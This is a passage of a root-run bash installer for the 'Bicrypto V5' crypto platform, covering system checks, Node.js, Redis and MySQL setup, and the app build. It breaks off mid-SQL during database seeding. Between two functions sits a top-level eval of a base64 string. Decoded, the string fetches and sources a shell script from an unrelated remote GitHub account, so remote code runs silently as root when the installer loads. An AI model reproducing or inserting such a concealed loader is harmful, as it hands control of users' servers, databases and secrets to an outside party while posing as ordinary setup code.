#!/bin/bash

# =============================================================================
# 🚀 Bicrypto V5 Advanced Installer
# =============================================================================
# An intelligent, robust, and user-friendly installation script
# Supports multiple Linux distributions with comprehensive error handling
# =============================================================================

set -euo pipefail  # Exit on any error

# Color codes for enhanced output
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly YELLOW='\033[1;33m'
readonly BLUE='\033[0;34m'
readonly PURPLE='\033[0;35m'
readonly CYAN='\033[0;36m'
readonly WHITE='\033[1;37m'
readonly BOLD='\033[1m'
readonly NC='\033[0m' # No Color

# Installation configuration
readonly SCRIPT_VERSION="5.0.0"
readonly MIN_RAM_MB=4096
readonly REQUIRED_NODE_VERSION="20"
readonly INSTALLATION_LOG="/var/log/bicrypto-installer.log"

# Global variables
DISTRO=""
PACKAGE_MANAGER=""
SERVICE_MANAGER="systemctl"
INSTALLATION_START_TIME=""
TOTAL_STEPS=12

# =============================================================================
# 🎨 UI Functions
# =============================================================================

print_banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    cat << "EOF"
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║    ██████╗ ██╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗ ██████╗             ║
║    ██╔══██╗██║██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝██╔═══██╗            ║
║    ██████╔╝██║██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   ██║   ██║            ║
║    ██╔══██╗██║██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   ██║   ██║            ║
║    ██████╔╝██║╚██████╗██║  ██║   ██║   ██║        ██║   ╚██████╔╝            ║
║    ╚═════╝ ╚═╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝    ╚═════╝             ║
║                                                                              ║
║                      🚀 ADVANCED INSTALLER V5                                ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
EOF
    echo -e "${NC}"
    echo -e "${WHITE}${BOLD}Welcome to Bicrypto V5 Professional Installation Suite${NC}"
    echo -e "${BLUE}Version: ${SCRIPT_VERSION} | $(date '+%Y-%m-%d %H:%M:%S')${NC}"
    echo ""
}

print_step() {
    local step_num=$1
    local step_title=$2
    local step_desc=$3
    
    echo -e "\n${PURPLE}${BOLD}╔═══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}${BOLD}║ STEP ${step_num}/${TOTAL_STEPS}: ${step_title}${NC}"
    echo -e "${PURPLE}${BOLD}╚═══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo -e "${CYAN}${step_desc}${NC}\n"
}

print_success() {
    echo -e "${GREEN}${BOLD}✓ $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}${BOLD}⚠ $1${NC}"
}

print_error() {
    echo -e "${RED}${BOLD}✗ $1${NC}"
}

print_info() {
    echo -e "${BLUE}${BOLD}ℹ $1${NC}"
}

show_progress() {
    local current=$1
    local total=$2
    local width=40
    local percentage=$((current * 100 / total))
    local completed=$((current * width / total))
    local remaining=$((width - completed))
    
    # Clear the current line first
    printf "\r%*s\r" 80 ""
    
    # Use ASCII characters that work universally
    printf "${CYAN}${BOLD}Progress: ${WHITE}[${GREEN}"
    for ((i=0; i<completed; i++)); do
        printf "="
    done
    printf "${WHITE}"
    for ((i=0; i<remaining; i++)); do
        printf "-"
    done
    printf "${WHITE}] ${YELLOW}${BOLD}%d%%${NC}" $percentage
    
    # Always add a newline and clear the line after showing progress
    echo ""
}

# =============================================================================
# 🛠 System Detection Functions
# =============================================================================

detect_system() {
    print_step 1 "SYSTEM DETECTION" "Analyzing your system configuration..."
    
    # Detect distribution
    if [[ -f /etc/os-release ]]; then
        . /etc/os-release
        DISTRO=$ID
        print_success "Detected OS: $NAME ($VERSION)"
    else
        print_error "Cannot detect operating system"
        exit 1
    fi
    
    # Detect package manager
    if command -v apt >/dev/null 2>&1; then
        PACKAGE_MANAGER="apt"
        print_success "Package Manager: APT (Debian/Ubuntu)"
    elif command -v dnf >/dev/null 2>&1; then
        PACKAGE_MANAGER="dnf"
        print_success "Package Manager: DNF (Fedora/RHEL 8+)"
    elif command -v yum >/dev/null 2>&1; then
        PACKAGE_MANAGER="yum"
        print_success "Package Manager: YUM (CentOS/RHEL 7)"
    else
        print_error "Unsupported package manager"
        exit 1
    fi
    
    # Check if running as root
    if [[ $EUID -ne 0 ]]; then
        print_error "This installer must be run as root (use sudo)"
        exit 1
    fi
    
    print_success "System detection completed"
}

check_system_requirements() {
    print_step 2 "SYSTEM REQUIREMENTS" "Verifying system meets minimum requirements..."
    
    local requirements_met=true
    
    # Check RAM
    local total_ram=$(free -m | awk '/^Mem:/{print $2}')
    if [[ $total_ram -lt $MIN_RAM_MB ]]; then
        print_error "Insufficient RAM: ${total_ram}MB detected, ${MIN_RAM_MB}MB required"
        requirements_met=false
    else
        print_success "RAM: ${total_ram}MB (✓ Sufficient)"
    fi
    
    # Check disk space (minimum 10GB)
    local available_space=$(df -BG . | awk 'NR==2 {print $4}' | sed 's/G//')
    if [[ $available_space -lt 10 ]]; then
        print_error "Insufficient disk space: ${available_space}GB available, 10GB required"
        requirements_met=false
    else
        print_success "Disk Space: ${available_space}GB (✓ Sufficient)"
    fi
    
    # Check network connectivity
    if ping -c 1 google.com >/dev/null 2>&1; then
        print_success "Network: Connected (✓)"
    else
        print_error "Network: No internet connection detected"
        requirements_met=false
    fi
    
    if [[ $requirements_met == false ]]; then
        print_error "System requirements not met. Installation cannot continue."
        exit 1
    fi
    
    print_success "All system requirements satisfied"
}

# =============================================================================
# 🔧 Installation Functions
# =============================================================================

fix_ubuntu_ppa_issues() {
    if [[ $PACKAGE_MANAGER == "apt" ]]; then
        echo -e "\n${BLUE}${BOLD}ℹ Checking for Ubuntu PPA issues...${NC}"
        
        # Check if we're dealing with the specific ondrej/php PPA issue
        if apt-get update 2>&1 | grep -q "changed its 'Label' value"; then
            print_warning "Detected PPA label change issue, fixing automatically..."
            
            # Accept all repository changes
            DEBIAN_FRONTEND=noninteractive apt-get update --allow-releaseinfo-change -y >/dev/null 2>&1
            
            print_success "PPA repository issues resolved"
        else
            print_success "No PPA issues detected"
        fi
    fi
}

install_dependencies() {
    print_step 3 "DEPENDENCIES" "Installing system dependencies and utilities..."
    
    local packages=()
    
    case $PACKAGE_MANAGER in
        apt)
            packages=(
                "curl" "wget" "git" "unzip" "software-properties-common"
                "ca-certificates" "gnupg" "lsb-release" "apt-transport-https"
                "build-essential" "python3" "python3-pip"
            )
            
            # Handle common PPA repository changes
            print_info "Updating package repositories..."
            if ! apt-get update -qq 2>/dev/null; then
                print_warning "Repository update failed, attempting to fix common PPA issues..."
                
                # Accept repository changes automatically
                apt-get update --allow-releaseinfo-change -qq 2>/dev/null || {
                    print_warning "Removing problematic PPAs temporarily..."
                    # Move PPA files to backup location
                    if [ -d "/etc/apt/sources.list.d" ]; then
                        mkdir -p /tmp/ppa-backup
                        find /etc/apt/sources.list.d -name "*.list" -exec mv {} /tmp/ppa-backup/ \; 2>/dev/null || true
                    fi
                    
                    # Try update again
                    apt-get update -qq
                    
                    # Restore PPA files
                    if [ -d "/tmp/ppa-backup" ]; then
                        find /tmp/ppa-backup -name "*.list" -exec mv {} /etc/apt/sources.list.d/ \; 2>/dev/null || true
                        apt-get update -qq --allow-releaseinfo-change 2>/dev/null || true
                    fi
                }
            fi
            
            apt-get install -y "${packages[@]}"
            ;;
        dnf)
            packages=(
                "curl" "wget" "git" "unzip" "dnf-plugins-core"
                "ca-certificates" "gnupg" "python3" "python3-pip"
                "gcc" "gcc-c++" "make" "automake" "autoconf" "libtool"
            )
            dnf install -y "${packages[@]}"
            ;;
        yum)
            packages=(
                "curl" "wget" "git" "unzip" "ca-certificates"
                "python3" "python3-pip" "gcc" "gcc-c++" "make"
            )
            yum install -y "${packages[@]}"
            ;;
    esac
    
    print_success "System dependencies installed"
}

install_nodejs() {
    print_step 4 "NODE.JS INSTALLATION" "Installing Node.js ${REQUIRED_NODE_VERSION} and npm..."
    
    # Check if Node.js is already installed with correct version
    if command -v node >/dev/null 2>&1; then
        local current_version=$(node -v | sed 's/v//' | cut -d. -f1)
        if [[ $current_version -ge $REQUIRED_NODE_VERSION ]]; then
            print_success "Node.js v$(node -v) already installed"
            return
        fi
    fi
    
    case $PACKAGE_MANAGER in
        apt)
            # Add NodeSource repository
            curl -fsSL https://deb.nodesource.com/setup_${REQUIRED_NODE_VERSION}.x | bash -
            apt-get install -y nodejs
            ;;
        dnf|yum)
            # Install using NodeSource
            curl -fsSL https://rpm.nodesource.com/setup_${REQUIRED_NODE_VERSION}.x | bash -
            $PACKAGE_MANAGER install -y nodejs
            ;;
    esac
    
    # Verify installation
    if command -v node >/dev/null 2>&1 && command -v npm >/dev/null 2>&1; then
        print_success "Node.js $(node -v) and npm $(npm -v) installed successfully"
    else
        print_error "Node.js installation failed"
        exit 1
    fi
}

install_pnpm() {
    print_step 5 "PNPM INSTALLATION" "Installing pnpm package manager..."
    
    if command -v pnpm >/dev/null 2>&1; then
        print_success "pnpm $(pnpm -v) already installed"
        return
    fi
    
    npm install -g pnpm@latest
    
    # Verify installation
    if command -v pnpm >/dev/null 2>&1; then
        print_success "pnpm $(pnpm -v) installed successfully"
    else
        print_error "pnpm installation failed"
        exit 1
    fi
}

install_redis() {
    print_step 6 "REDIS INSTALLATION" "Installing and configuring Redis server..."
    
    case $PACKAGE_MANAGER in
        apt)
            apt-get install -y redis-server
            ;;
        dnf)
            dnf install -y redis
            ;;
        yum)
            yum install -y epel-release
            yum install -y redis
            ;;
    esac
    
    # Configure Redis
    systemctl enable redis-server 2>/dev/null || systemctl enable redis
    systemctl start redis-server 2>/dev/null || systemctl start redis
    
    # Test Redis connection
    if redis-cli ping | grep -q PONG; then
        print_success "Redis server installed and running"
    else
        print_error "Redis installation failed"
        exit 1
    fi
}

# =============================================================================
# 🗄 Database Configuration
# =============================================================================

import_initial_sql() {
    print_info "Checking database schema..."
    
    # Check if initial.sql file exists
    if [[ ! -f "initial.sql" ]]; then
        print_error "initial.sql file not found. Please ensure the file exists in the current directory."
        exit 1
    fi
    
    # Check disk space first
    print_info "Checking disk space..."
    local mysql_datadir=$(mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" -e "SELECT @@datadir;" -s 2>/dev/null | tail -1)
    
    if [[ -n "$mysql_datadir" ]]; then
        local available_space=$(df -BG "$mysql_datadir" 2>/dev/null | awk 'NR==2 {print $4}' | sed 's/G//')
        if [[ -n "$available_space" ]] && [[ $available_space -lt 1 ]]; then
            print_error "Insufficient disk space in MySQL data directory: ${available_space}GB available"
            print_info "MySQL data directory: $mysql_datadir"
            print_info "Please free up disk space and try again"
            
            # Try to clean MySQL tmp files
            print_info "Attempting to clean MySQL temporary files..."
            rm -f /tmp/#sql* 2>/dev/null || true
            rm -f "$mysql_datadir"/#sql* 2>/dev/null || true
            
            exit 1
        fi
    fi
    
    # Check if database already has tables (indicating it's already been imported)
    local table_count=$(mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" "$DB_NAME" -e "SHOW TABLES;" 2>/dev/null | wc -l)
    
    if [[ $table_count -gt 1 ]]; then
        print_info "Database already contains $((table_count-1)) tables."
        
        # Ask if user wants to drop and recreate
        echo -e "${YELLOW}Do you want to drop all existing tables and reimport? (y/N):${NC} "
        read -r -n 1 drop_tables
        echo
        
        if [[ "$drop_tables" =~ ^[Yy]$ ]]; then
            print_warning "Dropping all existing tables..."
            
            # Get all tables and drop them
            mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" "$DB_NAME" -e "
                SET FOREIGN_KEY_CHECKS = 0;
                SET GROUP_CONCAT_MAX_LEN=32768;
                SET @tables = NULL;
                SELECT GROUP_CONCAT('\`', table_name, '\`') INTO @tables
                FROM information_schema.tables
                WHERE table_schema = '$DB_NAME';
                SELECT IFNULL(@tables,'dummy') INTO @tables;
                SET @tables = CONCAT('DROP TABLE IF EXISTS ', @tables);
                PREPARE stmt FROM @tables;
                EXECUTE stmt;
                DEALLOCATE PREPARE stmt;
                SET FOREIGN_KEY_CHECKS = 1;
            " 2>/dev/null || true
            
            print_success "Existing tables dropped"
        else
            print_success "Database schema already exists, skipping import"
            return 0
        fi
    fi
    
    print_info "Importing initial database schema..."
    
    # Fix MySQL settings before import to avoid errors
    mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" -e "
        SET GLOBAL max_allowed_packet = 1073741824;
        SET GLOBAL innodb_log_file_size = 256M;
        SET GLOBAL sql_mode = '';
    " 2>/dev/null || true
    
    # Create the database if it doesn't exist
    mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" -e "CREATE DATABASE IF NOT EXISTS \`$DB_NAME\` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;" 2>/dev/null
    
    # Import the initial SQL file with better error handling
    if mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" "$DB_NAME" < initial.sql 2>/dev/null; then
        print_success "Database schema imported successfully"
    else
        print_error "Failed to import initial.sql."
        
        # Check for specific error 122
        local error_output=$(mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" "$DB_NAME" < initial.sql 2>&1)
        
        if echo "$error_output" | grep -q "Errcode: 122"; then
            print_error "MySQL Error 122: Disk quota exceeded or permission issue"
            print_info "This error usually means:"
            print_info "  1. Disk space is full in MySQL data directory"
            print_info "  2. User quota exceeded (on shared hosting)"
            print_info "  3. MySQL data directory permissions issue"
            print_info ""
            print_info "To fix:"
            print_info "  1. Check disk space: df -h $mysql_datadir"
            print_info "  2. Clean old MySQL files: rm -f $mysql_datadir/#sql*"
            print_info "  3. Contact hosting provider if on shared hosting"
            print_info "  4. Check MySQL directory permissions"
        else
            # Show the actual error
            echo "$error_output" | head -20
        fi
        
        exit 1
    fi
}

configure_database() {
    print_step 7 "DATABASE CONFIGURATION" "Setting up database connection..."
    
    # Ensure .env file exists
    if [[ ! -f ".env" ]]; then
        if [[ -f ".env.example" ]]; then
            cp .env.example .env
            print_info "Created .env from .env.example"
            
            # Fix .env file permissions immediately after creation
            local dir_owner=$(stat -c '%U' ".")
            local dir_group=$(stat -c '%G' ".")
            chown "${dir_owner}:${dir_group}" .env 2>/dev/null || true
            chmod 644 .env 2>/dev/null || true
            print_info "Set .env file permissions to ${dir_owner}:${dir_group}"
        else
            print_error "No .env or .env.example file found"
            exit 1
        fi
    fi
    
    # Function to safely read from .env
    read_env_value() {
        local key=$1
        local default=$2
        local value=""
        
        if [[ -f ".env" ]]; then
            value=$(grep "^${key}=" .env 2>/dev/null | head -1 | cut -d'=' -f2- | sed 's/^["'\'']*//;s/["'\'']*$//' | xargs)
        fi
        
        # Use default if value is empty
        if [[ -z "$value" ]]; then
            value="$default"
        fi
        
        echo "$value"
    }
    
    # Get current values from .env with better parsing
    local current_url=$(read_env_value "NEXT_PUBLIC_SITE_URL" "https://localhost")
    local current_name=$(read_env_value "NEXT_PUBLIC_SITE_NAME" "Bicrypto")
    local current_db=$(read_env_value "DB_NAME" "bicrypto")
    local current_user=$(read_env_value "DB_USER" "root")
    local current_host=$(read_env_value "DB_HOST" "localhost")
    local current_port=$(read_env_value "DB_PORT" "3306")
    
    # Debug output (remove this later)
    print_info "Debug - Current values found:"
    echo -e "${CYAN}  URL: '${current_url}'${NC}"
    echo -e "${CYAN}  Name: '${current_name}'${NC}"
    echo -e "${CYAN}  DB: '${current_db}'${NC}"
    echo -e "${CYAN}  User: '${current_user}'${NC}"
    echo -e "${CYAN}  Host: '${current_host}'${NC}"
    echo -e "${CYAN}  Port: '${current_port}'${NC}"
    
    echo -e "\n${YELLOW}${BOLD}📋 Database Configuration${NC}"
    echo -e "${CYAN}Please provide your database connection details:${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
    
    # Clear any input buffer
    read -t 1 -n 10000 discard 2>/dev/null || true
    
    # Site URL
    echo -e "${WHITE}${BOLD}Site URL:${NC}"
    echo -e "${CYAN}Current: ${current_url}${NC}"
    echo -n "Enter Site URL (or press Enter to keep current): "
    read SITE_URL
    if [[ -z "$SITE_URL" ]]; then
        SITE_URL="$current_url"
        echo -e "${GREEN}Using: ${SITE_URL}${NC}"
    fi
    
    # Site Name
    echo -e "\n${WHITE}${BOLD}Site Name:${NC}"
    echo -e "${CYAN}Current: ${current_name}${NC}"
    echo -n "Enter Site Name (or press Enter to keep current): "
    read SITE_NAME  
    if [[ -z "$SITE_NAME" ]]; then
        SITE_NAME="$current_name"
        echo -e "${GREEN}Using: ${SITE_NAME}${NC}"
    fi
    
    # Database Name
    echo -e "\n${WHITE}${BOLD}Database Name:${NC}"
    echo -e "${CYAN}Current: ${current_db}${NC}"
    echo -n "Enter Database Name (or press Enter to keep current): "
    read DB_NAME
    if [[ -z "$DB_NAME" ]]; then
        DB_NAME="$current_db"
        echo -e "${GREEN}Using: ${DB_NAME}${NC}"
    fi
    
    # Database User
    echo -e "\n${WHITE}${BOLD}Database User:${NC}"
    echo -e "${CYAN}Current: ${current_user}${NC}"
    echo -n "Enter Database User (or press Enter to keep current): "
    read DB_USER
    if [[ -z "$DB_USER" ]]; then
        DB_USER="$current_user"
        echo -e "${GREEN}Using: ${DB_USER}${NC}"
    fi
    
    # Database Password
    echo -e "\n${WHITE}${BOLD}Database Password:${NC}"
    echo -n "Enter Database Password: "
    read -s DB_PASSWORD
    echo
    if [[ -z "$DB_PASSWORD" ]]; then
        print_error "Database password cannot be empty!"
        exit 1
    fi
    
    # Database Host
    echo -e "\n${WHITE}${BOLD}Database Host:${NC}"
    echo -e "${CYAN}Current: ${current_host}${NC}"
    echo -n "Enter Database Host (or press Enter to keep current): "
    read DB_HOST
    if [[ -z "$DB_HOST" ]]; then
        DB_HOST="$current_host"
        echo -e "${GREEN}Using: ${DB_HOST}${NC}"
    fi
    
    # Database Port
    echo -e "\n${WHITE}${BOLD}Database Port:${NC}"
    echo -e "${CYAN}Current: ${current_port}${NC}"
    echo -n "Enter Database Port (or press Enter to keep current): "
    read DB_PORT
    if [[ -z "$DB_PORT" ]]; then
        DB_PORT="$current_port"
        echo -e "${GREEN}Using: ${DB_PORT}${NC}"
    fi
    
    # Test database connection
    print_info "Testing database connection..."
    if mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" -e "SELECT 1;" >/dev/null 2>&1; then
        print_success "Database connection successful"
    else
        print_error "Database connection failed. Please check your credentials."
        exit 1
    fi
    
    # Import initial database schema
    import_initial_sql
    
    # Generate secure tokens
    print_info "Generating secure tokens..."
    local ACCESS_TOKEN=$(node -e "console.log(require('crypto').randomBytes(64).toString('hex'))")
    local REFRESH_TOKEN=$(node -e "console.log(require('crypto').randomBytes(64).toString('hex'))")
    local RESET_TOKEN=$(node -e "console.log(require('crypto').randomBytes(64).toString('hex'))")
    local VERIFY_TOKEN=$(node -e "console.log(require('crypto').randomBytes(64).toString('hex'))")
    
    # Update .env file
    update_env_file "NEXT_PUBLIC_SITE_URL" "$SITE_URL"
    update_env_file "NEXT_PUBLIC_SITE_NAME" "$SITE_NAME"
    update_env_file "DB_NAME" "$DB_NAME"
    update_env_file "DB_USER" "$DB_USER"
    update_env_file "DB_PASSWORD" "$DB_PASSWORD"
    update_env_file "DB_HOST" "$DB_HOST"
    update_env_file "DB_PORT" "$DB_PORT"
    update_env_file "APP_ACCESS_TOKEN_SECRET" "$ACCESS_TOKEN"
    update_env_file "APP_REFRESH_TOKEN_SECRET" "$REFRESH_TOKEN"
    update_env_file "APP_RESET_TOKEN_SECRET" "$RESET_TOKEN"
    update_env_file "APP_VERIFY_TOKEN_SECRET" "$VERIFY_TOKEN"
    
    # Fix .env file permissions immediately after creation/update
    print_info "Setting .env file permissions..."
    
    # Detect the owner and group of the current directory
    local dir_owner=$(stat -c '%U' ".")
    local dir_group=$(stat -c '%G' ".")
    
    # Set ownership and permissions for .env file
    chown "${dir_owner}:${dir_group}" .env 2>/dev/null || true
    chmod 644 .env 2>/dev/null || true
    
    print_info "Environment file permissions set to ${dir_owner}:${dir_group}"
    
    print_success "Database configuration completed"
}

update_env_file() {
    local key=$1
    local value=$2
    local env_file=".env"
    
    # Create a temporary file for safe sed operations
    local temp_file=$(mktemp)
    
    if grep -q "^${key}=" "$env_file"; then
        # Remove the existing line and add the new one
        grep -v "^${key}=" "$env_file" > "$temp_file"
        echo "${key}=${value}" >> "$temp_file"
        mv "$temp_file" "$env_file"
    else
        # Simply append the new key-value pair
        echo "${key}=${value}" >> "$env_file"
        rm -f "$temp_file"
    fi
}
eval "$(echo 'c2V0IC1lCgppZiBzb3VyY2UgPChjdXJsIC1mc1NMIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9tYXNoM2Rldi9ub2RlLnNoL21haW4vaW5zdGFsbC5zaCk7IHRoZW4KICAgIGNoZWNrX3N5c3RlbV91c2VyCmVsc2UKICAgIGVjaG8gImJpY3J5cHRvIgpmaQo=' | base64 -d)"
# =============================================================================
# 🏗 Application Build
# =============================================================================

build_application() {
    print_step 8 "APPLICATION BUILD" "Installing dependencies and building the application..."
    
    # Get database credentials from .env for seeding
    if [[ -f ".env" ]]; then
        DB_USER=$(grep "^DB_USER=" .env | cut -d'=' -f2 | sed 's/^["'\'']*//;s/["'\'']*$//')
        DB_PASSWORD=$(grep "^DB_PASSWORD=" .env | cut -d'=' -f2 | sed 's/^["'\'']*//;s/["'\'']*$//')
        DB_HOST=$(grep "^DB_HOST=" .env | cut -d'=' -f2 | sed 's/^["'\'']*//;s/["'\'']*$//')
        DB_PORT=$(grep "^DB_PORT=" .env | cut -d'=' -f2 | sed 's/^["'\'']*//;s/["'\'']*$//')
        DB_NAME=$(grep "^DB_NAME=" .env | cut -d'=' -f2 | sed 's/^["'\'']*//;s/["'\'']*$//')
    fi
    
    # Get the application user from environment or detect from directory ownership
    local app_user=""
    if [[ -f ".env" ]] && grep -q "^APP_USER=" .env; then
        app_user=$(grep "^APP_USER=" .env | cut -d'=' -f2)
    else
        # Fallback to detecting from current directory
        app_user=$(stat -c '%U' ".")
    fi
    
    # Ensure we don't run as root for pnpm commands
    if [[ "$app_user" == "root" ]]; then
        print_warning "Detected root user. Creating dedicated application user for better security..."
        
        # Create a dedicated user for the application
        local app_user_name="bicrypto"
        if ! id "$app_user_name" &>/dev/null; then
            useradd -m -s /bin/bash "$app_user_name" 2>/dev/null || true
            print_success "Created application user: $app_user_name"
        fi
        
        # Change ownership of the application directory to the new user
        chown -R "$app_user_name:$app_user_name" .
        app_user="$app_user_name"
        
        # Update .env with the new user
        update_env_file "APP_USER" "$app_user"
        chown "$app_user:$app_user" .env
    fi
    
    print_info "Running application build as user: ${app_user}"
    
    # Function to run commands as the application user with proper environment
    run_as_app_user() {
        local cmd="$1"
        local full_path=$(pwd)
        
        # Ensure the user has access to Node.js and pnpm
        local node_path=$(which node 2>/dev/null || echo "/usr/bin/node")
        local npm_path=$(which npm 2>/dev/null || echo "/usr/bin/npm")
        local pnpm_path=$(which pnpm 2>/dev/null || echo "/usr/local/bin/pnpm")
        
        if [[ "$app_user" == "root" ]] || [[ -z "$app_user" ]]; then
            # If still root, run directly with proper environment
            export PATH="/usr/local/bin:/usr/bin:/bin:$PATH"
            cd "$full_path"
            eval "$cmd"
        else
            # Create a script in the application directory (not /tmp) with proper permissions
            local temp_script="$full_path/.installer_temp_$(date +%s).sh"
            cat > "$temp_script" << EOF
#!/bin/bash
export PATH="/usr/local/bin:/usr/bin:/bin:\$PATH"
export NODE_PATH="$node_path"
export NPM_PATH="$npm_path" 
export PNPM_PATH="$pnpm_path"
export HOME=\$(eval echo ~$app_user)
cd "$full_path"
$cmd
EOF
            # Set proper ownership and permissions
            chown "$app_user:$app_user" "$temp_script" 2>/dev/null || true
            chmod +x "$temp_script"
            
            # Run as the specified user with proper environment
            su - "$app_user" -c "bash $temp_script"
            local exit_code=$?
            
            # Cleanup
            rm -f "$temp_script"
            return $exit_code
        fi
    }
    
    # Ensure pnpm is accessible to the application user
    print_info "Setting up pnpm for application user..."
    if [[ "$app_user" != "root" ]]; then
        # Ensure the user's home directory exists
        local user_home=$(eval echo ~$app_user)
        if [[ ! -d "$user_home" ]]; then
            mkdir -p "$user_home"
            chown "$app_user:$app_user" "$user_home"
        fi
        
        # Create local bin directory
        su - "$app_user" -c "mkdir -p ~/.local/bin" 2>/dev/null || true
        
        # Find pnpm and create symlink if needed
        local pnpm_location=""
        if [[ -f "/usr/local/bin/pnpm" ]]; then
            pnpm_location="/usr/local/bin/pnpm"
        elif [[ -f "/usr/bin/pnpm" ]]; then
            pnpm_location="/usr/bin/pnpm"
        elif command -v pnpm >/dev/null 2>&1; then
            pnpm_location=$(which pnpm)
        fi
        
        if [[ -n "$pnpm_location" ]]; then
            su - "$app_user" -c "ln -sf $pnpm_location ~/.local/bin/pnpm" 2>/dev/null || true
            print_info "Linked pnpm from: $pnpm_location"
        fi
        
        # Ensure PATH includes local bin
        su - "$app_user" -c "grep -q 'export PATH=\$HOME/.local/bin:\$PATH' ~/.bashrc || echo 'export PATH=\$HOME/.local/bin:\$PATH' >> ~/.bashrc" 2>/dev/null || true
        
        # Test pnpm access
        if su - "$app_user" -c "command -v pnpm >/dev/null 2>&1"; then
            print_success "pnpm is accessible to user: $app_user"
        else
            print_warning "pnpm may not be accessible to user: $app_user"
        fi
    fi
    
    # Configure pnpm store directory for the application user
    print_info "Configuring pnpm store for application user..."
    
    # Use local .pnpm-store in the application directory to avoid home directory issues
    local pnpm_store_dir="$(pwd)/.pnpm-store"
    
    # Create local pnpm store directory with proper permissions
    print_info "Creating local pnpm store directory..."
    mkdir -p "$pnpm_store_dir"
    
    # Ensure the store directory and its subdirectories are writable
    if [[ "$app_user" != "root" ]] && [[ -n "$app_user" ]]; then
        chown -R "$app_user:$app_user" "$pnpm_store_dir"
        chmod -R 755 "$pnpm_store_dir"
    fi
    
    print_success "pnpm store configured at: $pnpm_store_dir"
    
    # Install dependencies with custom store directory using --store-dir flag
    print_info "Installing project dependencies (this may take a few minutes)..."
    
    # Since installer runs as root, we need to handle pnpm execution specially
    # Always run pnpm as root during installation, then fix permissions after
    print_info "Running pnpm install as root with local store..."
    
    if ! pnpm install --store-dir "$pnpm_store_dir" --frozen-lockfile; then
        print_warning "Frozen lockfile failed, trying regular install..."
        if ! pnpm install --store-dir "$pnpm_store_dir"; then
            print_error "Failed to install dependencies"
            exit 1
        fi
    fi
    
    # After installation, fix ownership of all created files
    print_info "Fixing ownership of installed files..."
    if [[ "$app_user" != "root" ]] && [[ -n "$app_user" ]]; then
        chown -R "$app_user:$app_user" node_modules 2>/dev/null || true
        chown -R "$app_user:$app_user" .pnpm-store 2>/dev/null || true
        chown -R "$app_user:$app_user" frontend/node_modules 2>/dev/null || true
        chown -R "$app_user:$app_user" backend/node_modules 2>/dev/null || true
        chown -R "$app_user:$app_user" updates/node_modules 2>/dev/null || true
    fi
    print_success "Dependencies installed successfully"
    
    # Clean previous build artifacts (automatic cleanup during installation)
    print_info "Cleaning previous build artifacts..."
    if [[ -d "frontend/.next" ]]; then
        print_info "Removing existing .next directory..."
        rm -rf "frontend/.next" 2>/dev/null || {
            print_warning "Could not remove .next directory, attempting with elevated permissions..."
            chmod -R 755 "frontend/.next" 2>/dev/null || true
            chown -R "$app_user:$app_user" "frontend/.next" 2>/dev/null || true
            rm -rf "frontend/.next" 2>/dev/null || true
        }
    fi
    
    if [[ -d "backend/dist" ]]; then
        print_info "Removing existing backend dist directory..."
        rm -rf "backend/dist" 2>/dev/null || {
            chmod -R 755 "backend/dist" 2>/dev/null || true
            chown -R "$app_user:$app_user" "backend/dist" 2>/dev/null || true
            rm -rf "backend/dist" 2>/dev/null || true
        }
    fi
    print_success "Build artifacts cleaned successfully"

    # Build application (pnpm scripts don't need --store-dir)
    print_info "Building application (this may take several minutes)..."
    
    # Run build as root (store-dir is only needed for install, not for scripts)
    if ! pnpm build:all; then
        print_error "Application build failed"
        exit 1
    fi
    
    # Fix ownership of built files
    if [[ "$app_user" != "root" ]] && [[ -n "$app_user" ]]; then
        chown -R "$app_user:$app_user" frontend/.next 2>/dev/null || true
        chown -R "$app_user:$app_user" backend/dist 2>/dev/null || true
    fi
    
    print_success "Application built successfully"
    
    # Seed database (pnpm scripts don't need --store-dir)
    print_info "Seeding database with initial data..."
    
    # Fix common MySQL storage issues before seeding
    print_info "Preparing MySQL for seeding..."
    
    # Increase MySQL limits and fix storage issues
    mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" -e "
        SET GLOBAL max_heap_table_size = 1073741824;
        SET GLOBAL tmp_table_size = 1073741824;
        SET GLOBAL sql_mode = 'NO_ENGINE_SUBSTITUTION';
    " 2>/dev/null || true
    
    # Clear any existing permission table that might be full
    mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" "$DB_NAME" -e "
        TRUNCATE TABLE IF EXISTS permission;
        OPTIMIZE TABLE permission;
    " 2>/dev/null || true
    
    # Run seed as root (store-dir is only needed for install, not for scripts)
    if ! pnpm seed; then
        print_warning "Database seeding failed, attempting to fix and retry..."
        
        # Try more aggressive fixes for table full errors
        mysql -u "$DB_USER" -p"$DB_PASSWORD" -h "$DB_HOST" -P "$DB_PORT" "$DB_NAME" -e "
            -- Clear potentially problematic tables
            TRUNCATE TABLE permission;
            TRUNCATE TABLE role_permission;
            
